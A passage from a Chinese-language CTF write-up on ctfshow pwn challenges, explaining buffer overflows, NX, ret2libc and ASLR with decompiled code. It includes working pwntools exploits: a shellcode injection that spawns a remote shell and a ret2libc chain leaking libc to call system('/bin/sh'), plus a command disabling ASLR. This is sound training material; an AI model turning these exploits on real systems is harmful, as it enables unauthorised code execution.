寄存器的值作为函数指针，跳转到缓冲区中存储的地址执</p></li></ol><p>行。</p><ol start="7"><li>之后是一些清理工作和函数返回的准备操作。</li></ol><p>可能这里看得还是云里雾里，后面慢慢会逐步清晰起来。但实际上这题题目提示了可以使用</p><p>pwntools的shellcraft模块进行攻击</p><p>shellcraft 模块是 pwntools 库中的一个子模块，用于生成各种不同体系结构的 Shellcode。</p><p>Shellcode 是一段以二进制形式编写的代码，用于利用软件漏洞、执行特定操作或获取系统权限。</p><p>shellcraft 模块提供了一系列函数和方法，用于生成特定体系结构下的 Shellcode。</p><h4 id="lea-eax-ebp-buf-中S参数解析"><a href="#lea-eax-ebp-buf-中S参数解析" class="headerlink" title="lea     eax, [ebp+buf]  中S参数解析"></a>lea     eax, [ebp+buf]  中S参数解析</h4><p>在这段代码中，<code>lea eax, [ebp+buf]</code> 这条指令的作用是将 ebp 加上偏移量 buf 的结果加载到 eax 中。在这里，buf 是一个在栈中的局部变量，所以 <code>ebp+buf</code> 指向的就是这个变量在内存中的地址。然后，这个地址被存储在 eax 中。</p><p>接下来，这个地址被用作 puts 函数的参数。在 C 语言中，puts 函数的原型是 <code>int puts(const char *s)</code>，这意味着 puts 函数需要一个指向字符数组（即字符串）的指针作为参数。这个参数在这里被称为 “s 地址”。</p><p>所以，在这个上下文中，”s 地址” 就是指向你想要打印的字符串的地址。换句话说，它就是你要 puts 函数打印的字符串在内存中的位置。在这段代码中，字符串是在 buf 中存储的，所以 <code>lea eax, [ebp+buf]</code> 这条指令就是在获取这个字符串的地址，然后将其传递给 puts 函数进行打印\1. 函数开始时进行一些栈操作，保存寄存器的值。</p><h3 id="（一）漏洞产生"><a href="#（一）漏洞产生" class="headerlink" title="（一）漏洞产生"></a>（一）漏洞产生</h3><p>从给出的代码片段来看，这个程序中的漏洞可能出现在 <code>ctfshow</code> 函数中，具体的错误是缓冲区溢出（buffer overflow）和任意代码执行。这是因为该函数接收的输入大小没有被正确限制，并且接收的输入会被作为代码执行。</p><p>详细来说，漏洞在下列代码部分出现：</p><pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">push    100h            ; nbyteslea     eax, [ebp+buf]push    eax             ; bufpush    0               ; fdcall    _read<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在这段代码中，<code>_read</code> 函数从文件描述符 <code>0</code>（也就是标准输入）读取 <code>100h</code>（也就是 256）字节的数据，并将其存储在 <code>buf</code> 中。然而 <code>buf</code> 的大小是 <code>88h</code>（也就是 136）字节，这就造成了缓冲区溢出。因为 <code>_read</code> 函数会读取比 <code>buf</code> 更多的数据，所以超过 <code>buf</code> 大小的部分会覆盖其他内存区域，这个就是缓冲区溢出漏洞。</p><p>此外，另一个漏洞出现在：</p><pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">lea     eax, [ebp+buf]call    eax<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>在这段代码中，<code>call eax</code> 试图执行存在于 <code>buf</code> 的代码。由于之前的缓冲区溢出漏洞，攻击者可以控制这个缓冲区的内容，从而控制程序的执行流程。这就是任意代码执行漏洞。</p><p>这种类型的漏洞通常出现的原因是程序员在处理用户输入时未进行正确的边界检查。处理用户输入是编程中的一个重要且常见的任务，但如果不正确地进行，就很容易引入安全漏洞。在这个例子中，程序员应该限制 <code>_read</code> 函数读取的数据量，使其不超过 <code>buf</code> 的大小，并且不应该试图执行用户提供的数据。</p><h3 id="（二）exp-py"><a href="#（二）exp-py" class="headerlink" title="（二）exp.py"></a>（二）exp.py</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python">from pwn import *context.log_level = 'debug'io=remote("pwn.challenge.ctf.show", 28148)payload=asm(shellcraft.sh())io.sendline(payload)io.interactive()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在这个示例中，目标程序存在一个典型的安全漏洞：它接收用户的输入，并试图将这个输入作为代码执行。如果攻击者可以控制这个输入，那么他们就可以执行任意代码，这就是常见的缓冲区溢出漏洞。</p><p>为了利用这个漏洞，攻击者需要提供一段将被执行的代码，这就是 shellcode 的由来。在这个示例中，攻击者希望弹出一个 shell，所以他们需要一个能够执行 shell 的 shellcode。</p><p>Python 脚本首先使用 pwntools 的 <code>shellcraft.sh()</code> 函数生成这个 shellcode。这个函数生成一段在目标系统上执行 shell 的代码，这个代码在 Linux 系统上通常会执行 <code>/bin/sh</code>。然后 <code>asm</code> 函数将这个 shellcode 从汇编代码转换为可以在目标系统上执行的机器代码。</p><p>接下来，脚本使用 pwntools 的 <code>remote</code> 函数连接到目标服务器。这个函数需要两个参数：目标服务器的地址和端口号。脚本通过这个连接将生成的 shellcode 发送到目标服务器。</p><p>当目标服务器接收到这个 shellcode 后，目标程序的漏洞就会被触发：程序会尝试执行接收到的数据作为代码。由于数据实际上是攻击者提供的 shellcode，所以这就导致了一个 shell 被弹出。</p><p>最后，脚本使用 pwntools 的 <code>interactive</code> 函数，使 Python 脚本的输入输出转换为交互式的。这样就允许攻击者通过 Python 脚本的控制台来操作在目标服务器上弹出的 shell，执行任意命令。</p><p>总的来说，这个脚本的工作原理是：生成 shellcode，连接到目标服务器，发送 shellcode，触发漏洞，然后控制弹出的 shell。这个方法依赖于目标程序的具体漏洞，以及 pwntools 库提供的方便的工具。</p><h2 id="十三、pwn025（NX保护ret2libc）"><a href="#十三、pwn025（NX保护ret2libc）" class="headerlink" title="十三、pwn025（NX保护ret2libc）"></a>十三、pwn025（NX保护ret2libc）</h2><h3 id="（一）mainC源代码"><a href="#（一）mainC源代码" class="headerlink" title="（一）mainC源代码"></a>（一）mainC源代码</h3><pre class="line-numbers language-c" data-language="c"><code class="language-c">int __cdecl main(int argc, const char **argv, const char **envp){  setvbuf(stdin, 0, 1, 0); //这是一个库函数，用于改变stdin（标准输入）的缓冲方式。在这里，第二个参数是NULL，表示不使用缓冲；第三个参数是1，表示设置为行缓冲方式；第四个参数是缓冲区大小，这里为0，因为不使用缓冲。  setvbuf(stdout, 0, 2, 0);//这也是一个库函数，用于改变stdout（标准输出）的缓冲方式。在这里，第二个参数是NULL，表示不使用缓冲；第三个参数是2，表示设置为全缓冲；第四个参数是缓冲区大小，这里为0，因为不使用缓冲。  ctfshow(&amp;argc);  logo();  write(0, "Hello CTFshow!\n", 0xEu);//这是一个系统调用，用于写入数据到文件描述符。在这里，0是文件描述符，表示标准输入；"Hello CTFshow!\n"是要写入的数据；0xEu是数据的长度，0xEu是十六进制表示，等于十进制的14。  return 0;}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-c" data-language="c"><code class="language-c">ssize_t ctfshow(){  char buf[132]; // [esp+0h] [ebp-88h] BYREF  return read(0, buf, 0x100u);}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="（二）exp-py-ret2libc-攻击方法"><a href="#（二）exp-py-ret2libc-攻击方法" class="headerlink" title="（二）exp.py                (ret2libc     攻击方法)"></a>（二）exp.py                (ret2libc     攻击方法)</h3><p>首先，NX，全称No-eXecute，也叫做DEP（Data Execution Prevention，数据执行防止），是一种安全机制，用于防止恶意软件通过注入代码到数据段或堆栈段来执行恶意代码。它可以将内存标记为非可执行，这样处理器就不会在这些区域执行代码。这个机制可以有效防止缓冲区溢出攻击。</p><p>然后，ret2libc是一种绕过NX保护的攻击方法。由于NX保护阻止在非执行内存（如堆和栈）上执行代码，攻击者不能简单地插入并执行恶意代码。但是，攻击者可以利用已经存在的可执行代码片段，这些代码片段就是程序已经加载的库函数，例如C标准库libc。</p><p>在ret2libc攻击中，攻击者利用缓冲区溢出漏洞，改变返回地址，使其指向libc中的函数（如system），并在栈上布置参数。这样，当函数返回时，不会返回到原来的位置，而是跳转到libc的函数，执行攻击者预设的命令。这种攻击方法不需要在内存中注入新的代码，所以可以绕过NX保护。</p><p>所以，”开启NX保护，或许可以试试ret2libc”的意思是，如果目标系统开启了NX保护，可以考虑使用ret2libc这种攻击策略。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">from pwn import *from LibcSearcher import *context.log_level = 'debug'#io = process('./pwn')#io = remote('127.0.0.1',10000)io = remote("pwn.challenge.ctf.show", 28177)elf = ELF('./pwn')main = elf.sym['main']write_got = elf.got['write']write_plt = elf.plt['write']payload = cyclic(0x88+0x4) + p32(write_plt) + p32(main) + p32(0) +p32(write_got) + p32(4)io.sendline(payload)write = u32(io.recv(4))print hex(write)libc = LibcSearcher('write',write)libc_base = write - libc.dump('write')system = libc_base + libc.dump('system')bin_sh = libc_base + libc.dump('str_bin_sh')payload = cyclic(0x88+0x4) + p32(system) + p32(main) + p32(bin_sh)io.sendline(payload)io.interactive()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="十四、pwn026"><a href="#十四、pwn026" class="headerlink" title="十四、pwn026"></a>十四、pwn026</h2><h3 id="（一）main函数C源代码"><a href="#（一）main函数C源代码" class="headerlink" title="（一）main函数C源代码"></a>（一）main函数C源代码</h3><pre class="line-numbers language-c" data-language="c"><code class="language-c">int __cdecl main(int argc, const char **argv, const char **envp){  void *ptr; // [rsp+0h] [rbp-10h] 分配用于保存堆内存分配指针的变量  void *v5; // [rsp+8h] [rbp-8h] 分配用于保存动态库加载地址的变量  ptr = malloc(4uLL); // 申请4字节的内存空间，将地址赋给ptr  v5 = dlopen("/lib/x86_64-linux-gnu/libc.so.6", 258); // 动态加载libc库，将库的地址赋给v5  puts(s); // 输出字符串s  puts(asc_4008F0); // 输出字符串asc_4008F0  puts(asc_400970); // 输出字符串asc_400970  puts(asc_400A00); // 输出字符串asc_400A00  puts(asc_400A90); // 输出字符串asc_400A90  puts(asc_400B18); // 输出字符串asc_400B18  puts(asc_400BB0); // 输出字符串asc_400BB0  puts("    * *************************************                           ");  puts(aClassifyCtfsho); // 输出字符串aClassifyCtfsho  puts("    * Type  : Linux_Security_Mechanisms                               ");  puts("    * Site  : https://ctf.show/                                       ");  puts("    * Hint  : Please confirm your ASLR level first !                  ");  puts("    * *************************************                           ");  puts("Here is your ASLR level:");  system("cat /proc/sys/kernel/randomize_va_space"); // 执行系统命令，获取ASLR级别  puts("If the result is 0, then you get the correct flag!");  puts("If not,you will get a fake flag!");  printf("flag is :ctfshow{%p", main); // 输出当前main函数的地址  printf("_%p", system); // 输出system函数的地址  printf("_%p", ptr); // 输出申请的堆内存地址  printf("_%p", v5); // 输出动态加载的libc库地址  puts("}"); // 输出字符串"}"  free(ptr); // 释放之前申请的内存  return 0; // 返回0，表示程序执行成功}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="（二）main函数汇编源代码"><a href="#（二）main函数汇编源代码" class="headerlink" title="（二）main函数汇编源代码"></a>（二）main函数汇编源代码</h3><pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">public mainmain proc nearptr= qword ptr -10h     ; 在栈帧中声明一个8字节变量ptr，用于存储malloc函数的返回值var_8= qword ptr -8     ; 在栈帧中声明一个8字节变量var_8，用于存储dlopen函数的返回值push    rbp             ; 将当前rbp寄存器的值压入栈中，保存现场mov     rbp, rsp        ; 将rsp寄存器的值复制到rbp寄存器，设置新的帧基址sub     rsp, 10h        ; 将rsp寄存器的值减去16，分配栈空间给局部变量ptr和var_8mov     edi, 4          ; 将4传递给malloc函数作为参数，即请求分配4字节的内存call    _malloc         ; 调用malloc函数mov     [rbp+ptr], rax  ; 将malloc返回的内存地址（在rax寄存器中）存入ptr变量mov     esi, 102h       ; 将258（十六进制表示为102h）传递给dlopen函数作为mode参数mov     edi, offset file ; 将"/lib/x86_64-linux-gnu/libc.so.6"字符串的地址传递给dlopen函数作为name参数call    _dlopen         ; 调用dlopen函数加载libc库mov     [rbp+var_8], rax ; 将dlopen返回的动态库句柄地址（在rax寄存器中）存入var_8变量; 以下部分代码多次调用_puts函数输出各种字符串，这些字符串的地址通过edi寄存器传递给_puts函数mov     edi, offset command ; "cat /proc/sys/kernel/randomize_va_space"call    _system         ; 调用_system函数执行系统命令，查看ASLR级别; 以下部分代码再次多次调用_puts函数输出各种字符串，这些字符串的地址通过edi寄存器传递给_puts函数mov     esi, offset main ; 获取main函数的地址，传递给_printf函数作为参数mov     edi, offset format ; "flag is :ctfshow{%p"mov     eax, 0call    _printf         ; 调用_printf函数输出字符串，其中包含main函数的地址mov     esi, offset _system ; 获取_system函数的地址，传递给_printf函数作为参数mov     edi, offset aP  ; "_%p"mov     eax, 0call    _printf         ; 调用_printf函数输出字符串，其中包含_system函数的地址mov     rax, [rbp+ptr]  ; 获取ptr变量中存储的堆内存地址，传递给_printf函数作为参数mov     rsi, raxmov     edi, offset aP  ; "_%p"mov     eax, 0call    _printf         ; 调用_printf函数输出字符串，其中包含堆内存地址mov     rax, [rbp+var_8] ; 获取var_8变量中存储的动态库句柄地址，传递给_printf函数作为参数mov     rsi, raxmov     edi, offset aP  ; "_%p"mov     eax, 0call    _printf         ; 调用_printf函数输出字符串，其中包含动态库句柄地址mov     edi, offset asc_400E51 ; "}"call    _puts           ; 调用_puts函数输出字符串"}"mov     rax, [rbp+ptr]  mov     rdi, rax        ; 获取ptr变量中存储的堆内存地址，传递给_free函数作为参数call    _free           ; 调用_free函数释放之前申请的堆内存mov     eax, 0          ; 设置函数返回值为0leave                   ; 恢复旧的rbp和rsp，清理栈帧retn                    ; 从main函数返回main endp<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="（三）ASLR"><a href="#（三）ASLR" class="headerlink" title="（三）ASLR"></a>（三）ASLR</h3><p>ASLR（Address Space Layout Randomization）是一种操作系统级别的安全保护机制，旨在增加</p><p>软件系统的安全性。它通过随机化程序在内存中的布局，使得攻击者难以准确地确定关键代码和数据的</p><p>位置，从而增加了利用软件漏洞进行攻击的难度。</p><p>开启不同等级会有不同的效果：</p><ol><li>内存布局随机化： ASLR的主要目标是随机化程序的内存布局。在传统的内存布局中，不同的</li></ol><p>库和模块通常会在固定的内存位置上加载，攻击者可以利用这种可预测性来定位和利用漏洞。</p><p>ASLR通过随机化这些模块的加载地址，使得攻击者无法准确地确定内存中的关键数据结构和</p><p>代码的位置。</p><ol start="2"><li>地址空间范围的随机化： ASLR还会随机化进程的地址空间范围。在传统的地址空间中，栈、</li></ol><p>堆、代码段和数据段通常会被分配到固定的地址范围中。ASLR会随机选择地址空间的起始位</p><p>置和大小，从而使得这些重要的内存区域在每次运行时都有不同的位置。</p><ol start="3"><li>随机偏移量： ASLR会引入随机偏移量，将程序和模块在内存中的相对位置随机化。这意味着</li></ol><p>每个模块的实际地址是相对于一个随机基址偏移的，而不是绝对地址。攻击者需要在运行时发</p><p>现这些偏移量，才能准确地定位和利用漏洞。</p><ol start="4"><li>堆和栈随机化： ASLR也会对堆和栈进行随机化。堆随机化会在每次分配内存时选择不同的起</li></ol><p>始地址，使得攻击者无法准确地预测堆上对象的位置。栈随机化会随机选择栈帧的起始位置，</p><p>使得攻击者无法轻易地覆盖返回地址或控制程序流程。</p><p>在Linux中，ALSR的全局配置/proc/sys/kernel/randomize_va_space有三种情况：</p><p>0表示关闭ALSR</p><p>1表示部分开启（将mmap的基址、stack和vdso页面随机化）</p><p>2表示完全开启<strong>ALSR</strong></p><p><img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/image-20230725155733515.png" alt="image-20230725155733515"></p><h3 id="（四）malloc函数"><a href="#（四）malloc函数" class="headerlink" title="（四）malloc函数"></a>（四）malloc函数</h3><p>1.<code>malloc</code>是一个在C和C++语言中的库函数，用于动态内存分配。<code>malloc</code>函数的原型是<code>void* malloc(size_t size)</code>，这个函数会请求操作系统分配一块大小为<code>size</code>字节的内存，并返回这块内存的首地址。如果分配失败，它会返回一个<code>NULL</code>指针。</p><p>在你的程序中，<code>malloc(4uLL);</code>这行代码是请求操作系统分配4个字节的内存，并将返回的地址保存在变量<code>ptr</code>中。</p><p>2.动态内存分配是编程中的一个重要概念，特别是在C和C++这样的底层语言中。通过动态内存分配，程序可以在运行时根据需要申请任意大小的内存空间。这比静态分配的方式更灵活，可以更好地利用有限的内存资源。</p><p>在你的程序中，<code>malloc(4uLL);</code>这行代码的作用可能主要是为了获取一个堆内存的地址。然后这个地址在后面被用于生成一部分的标志位字符串。这就是这个<code>malloc</code>调用在你的程序中的具体用途。</p><p>更一般的情况是，动态内存分配（如<code>malloc</code>函数）常常用于以下几种情况：</p><ol><li>当你需要创建一个大小在编译时无法确定的数组时。比如，你要根据用户输入的值来创建一个数组，这时就需要动态内存分配。</li><li>当你需要创建一个生命周期超出其定义范围的对象时。比如，在一个函数中创建一个对象，并希望这个对象在函数返回后仍然存在。</li><li>当你需要创建一个大对象时，如大数组或大结构，通常会在堆上而不是栈上分配它们，以防止栈溢出。</li></ol><p>不过使用<strong>动态内存分配</strong>时需要注意，分配的内存在用完后应该由<strong>程序显式地释放</strong>，否则会造成<strong>内存泄漏</strong>。在你的程序中，这通过<code>free(ptr);</code>这行代码完成。</p><h3 id="（五）题解"><a href="#（五）题解" class="headerlink" title="（五）题解"></a>（五）题解</h3><h4 id="1-执行echo-0-gt-x2F-proc-x2F-sys-x2F-kernel-x2F-randomize-va-space"><a href="#1-执行echo-0-gt-x2F-proc-x2F-sys-x2F-kernel-x2F-randomize-va-space" class="headerlink" title="1.执行echo 0 > /proc/sys/kernel/randomize_va_space"></a>1.执行echo 0 &gt; /proc/sys/kernel/randomize_va_space</h4><h4 id="2-运行文件"><a href="#2-运行文件" class="headerlink" title="2.运行文件"></a>2.运行文件</h4><h2 id="十五、pwn027"><a href="#十五、pwn027" class="headerlink" title="十五、pwn027"></a>十五、pwn027</h2><h3 id="（一）main函数汇编源代码"><a href="#（一）main函数汇编源代码" class="headerlink" title="（一）main函数汇编源代码"></a>（一）main函数汇编源代码</h3><pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">; int __cdecl main(int argc, const char **argv, const char **envp)public main  ; 定义main函数为公共函数，其他文件可引用main proc near  ; main函数开始ptr= qword ptr -10h  ; 在栈上声明一个变量ptr，从rbp向下偏移0x10的位置var_8= qword ptr -8  ; 在栈上声明一个变量var_8，从rbp向下偏移0x8的位置; __unwind {push    rbp  ; 保存旧的rbp值mov     rbp, rsp  ; 把当前栈顶地址（rsp）赋值给rbp，创建新的栈帧sub     rsp, 10h  ; 栈顶向下移动0x10个字节，为局部变量留出空间mov     edi, 4    ; 把4赋值给edi，此处即为malloc函数的参数，请求分配4字节的内存call    _malloc   ; 调用malloc函数，返回的指针存放在rax寄存器中mov     [rbp+ptr], rax  ; 把malloc返回的地址存储在ptr变量中mov     esi, 102h  ; 把0x102赋值给esi，此处即为dlopen函数的mode参数mov     edi, offset file ; "./libc-2.27.so"  ; 把"./libc-2.27.so"的地址赋值给edi，此处即为dlopen函数的filename参数call    _dlopen  ; 调用dlopen函数，返回的句柄存放在rax寄存器中mov     [rbp+var_8], rax  ; 把dlopen返回的句柄存储在var_8变量中... ; 之后的部分都是类似的结构，对于每个调用_puts、_printf、_system等函数的部分，它们分别把一些字符串输出到控制台或者执行一些命令mov     rax, [rbp+ptr]  ; 从ptr变量中获取之前malloc的内存地址mov     rdi, rax        ; 把地址赋值给rdi，此处即为free函数的参数call    _free  ; 调用free函数，释放之前分配的内存mov     eax, 0  ; 把0赋值给eax，作为main函数的返回值leave  ; 恢复rbp和rsp到调用前的值，即销毁当前栈帧retn  ; 从main函数返回; } // starts at 400687main endp  ; main函数结束<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="（二）main函数C源代码"><a href="#（二）main函数C源代码" class="headerlink" title="（二）main函数C源代码"></a>（二）main函数C源代码</h3><pre class="line-numbers language-c" data-language="c"><code class="language-c">int __cdecl main(int argc, const char **argv, const char **envp){  void *ptr; // [rsp+0h] [rbp-10h]  ptr = malloc(4uLL);  dlopen("./libc-2.27.so", 258);  puts(s);  puts(asc_4008D0);  puts(asc_400950);  puts(asc_4009E0);  puts(asc_400A70);  puts(asc_400AF8);  puts(asc_400B90);  puts("    * *************************************                           ");  puts(aClassifyCtfsho);  puts("    * Type  : Linux_Security_Mechanisms                               ");  puts("    * Site  : https://ctf.show/                                       ");  puts("    * Hint  : Please confirm your ASLR level first !                  ");  puts("    * *************************************                           ");  puts("Here is your ASLR level:");  system("cat /proc/sys/kernel/randomize_va_space");  puts("If the result is 0 or 1, then you get the correct flag!");  puts("If not,you will get a fake flag!");  printf("flag is :ctfshow{%p", main);  printf("_%p", system);  printf("_%p", ptr);  puts("}");  free(ptr);  return 0;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="十六、pwn28"><a href="#十六、pwn28" class="headerlink" title="十六、pwn28"></a>十六、pwn28</h2><h3 id="C源代码-2"><a href="#C源代码-2" class="headerlink" title="C源代码"></a>C源代码</h3><pre class="line-numbers language-c" data-language="c"><code class="language-c">int __cdecl main(int argc, const char **argv, const char **envp){  void *ptr; // [rsp+0h] [rbp-10h]  ptr = malloc(4uLL);  dlopen("./libc-2.27.so", 258);  puts(s);  puts(asc_4008A0);  puts(asc_400920);  puts(asc_4009B0);  puts(asc_400A40);  puts(asc_400AC8);  puts(asc_400B60);  puts("    * *************************************                           ");  puts(aClassifyCtfsho);  puts("    * Type  : Linux_Security_Mechanisms                               ");  puts("    * Site  : https://ctf.show/                                       ");  puts("    * Hint  : Please confirm your ASLR level first !                  ");  puts("    * *************************************                           ");  puts("Here is your ASLR level:");  system("cat /proc/sys/kernel/randomize_va_space");  printf("flag is :ctfshow{%p", main);  printf("_%p", system);  puts("}");  free(ptr);  return 0;}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="汇编源代码-1"><a href="#汇编源代码-1" class="headerlink" title="汇编源代码"></a>汇编源代码</h3><pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">; Attributes: bp-based frame; int __cdecl main(int argc, const char **argv, const char **envp)public mainmain proc nearptr= qword ptr -10hvar_8= qword ptr -8; __unwind {push    rbpmov     rbp, rspsub     rsp, 10hmov     edi, 4          ; sizecall    _mallocmov     [rbp+ptr], raxmov     esi, 102h       ; modemov     edi, offset file ; "./libc-2.27.so"call    _dlopenmov     [rbp+var_8], raxmov     edi, offset s   ; "    "call    _putsmov     edi, offset asc_4008A0 ; "  "call    _putsmov     edi, offset asc_400920 ; " "call    _putsmov     edi, offset asc_4009B0 ; " "call    _putsmov     edi, offset asc_400A40 ; " "call    _putsmov     edi, offset asc_400AC8 ; "  "call    _putsmov     edi, offset asc_400B60 ; "    "call    _putsmov     edi, offset asc_400BE0 ; "    * *********************************"...call    _putsmov     edi, offset aClassifyCtfsho ; "    * Classify: CTFshow --- PWN --- "call    _putsmov     edi, offset aTypeLinuxSecur ; "    * Type  : Linux_Security_Mechanisms"...call    _putsmov     edi, offset aSiteHttpsCtfSh ; "    * Site  : https://ctf.show/        "...call    _putsmov     edi, offset aHintPleaseConf ; "    * Hint  : Please confirm your ASLR "...call    _putsmov     edi, offset asc_400BE0 ; "    * *********************************"...call    _putsmov     edi, offset aHereIsYourAslr ; "Here is your ASLR level:"call    _putsmov     edi, offset command ; "cat /proc/sys/kernel/randomize_va_space"call    _systemmov     esi, offset mainmov     edi, offset format ; "flag is :ctfshow{%p"mov     eax, 0call    _printfmov     esi, offset _systemmov     edi, offset aP  ; "_%p"mov     eax, 0call    _printfmov     edi, offset asc_400DA8 ; "}"call    _putsmov     rax, [rbp+ptr]mov     rdi, rax        ; ptrcall    _freemov     eax, 0leaveretn; } // starts at 400687main endp<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="十七、pwn29"><a href="#十七、pwn29" class="headerlink" title="十七、pwn29"></a>十七、pwn29</h2><h3 id="（一）C源代码"><a href="#（一）C源代码" class="headerlink" title="（一）C源代码"></a>（一）C源代码</h3><pre class="line-numbers language-c" data-language="c"><code class="language-c">int __cdecl main(int argc, const char **argv, const char **envp){  char v4[4]; // [rsp+4h] [rbp-1Ch] BYREF  void *ptr; // [rsp+8h] [rbp-18h]  void *v6; // [rsp+10h] [rbp-10h]  unsigned __int64 v7; // [rsp+18h] [rbp-8h]  v7 = __readfsqword(0x28u);  ptr = malloc(4uLL);  v6 = dlopen("./libc-2.27.so", 258);  puts(s);  puts(asc_B10);  puts(asc_B90);  puts(asc_C20);  puts(asc_CB0);  puts(asc_D38);  puts(asc_DD0);  puts("    * *************************************                           ");  puts(aClassifyCtfsho);  puts("    * Type  : Linux_Security_Mechanisms                               ");  puts("    * Site  : https://ctf.show/                                       ");  puts("    * Hint  : Please confirm your ASLR level first !                  ");  puts("    * *************************************                           ");  system("echo 2 &gt; /proc/sys/kernel/randomize_va_space");  puts("Here is your ASLR level:");  system("cat /proc/sys/kernel/randomize_va_space");  puts("Let's take a look at protection:");  system("checksec pwn");  printf("executable: %p\n", main);  printf("system@plt: %p\n", &amp;system);  printf("heap: %p\n", ptr);  printf("stack: %p\n", v4);  puts("As you can see, the protection has been fully turned on and the address has been completely randomized!");  puts("Here is your flag:");  puts("ctfshow{Address_Space_Layout_Randomization&amp;&amp;Position-Independent_Executable_1s_C0000000000l!}");  free(ptr);  return 0;}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="（二）汇编源代码"><a href="#（二）汇编源代码" class="headerlink" title="（二）汇编源代码"></a>（二）汇编源代码</h3><pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">; Attributes: bp-based frame; int __cdecl main(int argc, const char **argv, const char **envp)public mainmain proc nearvar_1C= byte ptr -1Chptr= qword ptr -18hvar_10= qword ptr -10hvar_8= qword ptr -8; __unwind {push    rbpmov     rbp, rspsub     rsp, 20hmov     rax, fs:28hmov     [rbp+var_8], raxxor     eax, eaxmov     edi, 4          ; sizecall    _mallocmov     [rbp+ptr], raxmov     esi, 102h       ; modelea     rdi, file       ; "./libc-2.27.so"call    _dlopenmov     [rbp+var_10], raxlea     rdi, s          ; "    "call    _putslea     rdi, asc_B10    ; "  "call    _putslea     rdi, asc_B90    ; " "call    _putslea     rdi, asc_C20    ; " "call    _putslea     rdi, asc_CB0    ; " "call    _putslea     rdi, asc_D38    ; "  "call    _putslea     rdi, asc_DD0    ; "    "call    _putslea     rdi, asc_E50    ; "    * *********************************"...call    _putslea     rdi, aClassifyCtfsho ; "    * Classify: CTFshow --- PWN --- "call    _putslea     rdi, aTypeLinuxSecur ; "    * Type  : Linux_Security_Mechanisms"...call    _putslea     rdi, aSiteHttpsCtfSh ; "    * Site  : https://ctf.show/        "...call    _putslea     rdi, aHintPleaseConf ; "    * Hint  : Please confirm your ASLR "...call    _putslea     rdi, asc_E50    ; "    * *********************************"...call    _putslea     rdi, command    ; "echo 2 &gt; /proc/sys/kernel/randomize_va_"...call    systemlea     rdi, aHereIsYourAslr ; "Here is your ASLR level:"call    _putslea     rdi, aCatProcSysKern ; "cat /proc/sys/kernel/randomize_va_space"call    systemlea     rdi, aLetSTakeALookA ; "Let's take a look at protection:"call    _putslea     rdi, aChecksecPwn ; "checksec pwn"call    systemlea     rsi, mainlea     rdi, format     ; "executable: %p\n"mov     eax, 0call    _printfmov     rax, cs:system_ptrmov     rsi, raxlea     rdi, aSystemPltP ; "system@plt: %p\n"mov     eax, 0call 